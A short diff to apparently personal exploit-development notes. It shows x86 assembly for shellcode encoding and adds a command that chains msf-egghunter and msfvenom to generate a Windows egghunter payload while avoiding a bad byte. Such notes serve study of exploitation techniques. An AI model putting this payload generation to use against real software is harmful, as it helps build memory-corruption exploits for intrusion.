@@ -101,3 +101,8 @@ AND EAX,2A313235
 54               PUSH ESP
 58               POP EAX
 ```
+
+# Egg Hunter w/o specific bytes
+```
+msf-egghunter -f raw -e dead | msfvenom -p - --platform windows -a x86 -b '\x2e' -f python -v egghunter
+```
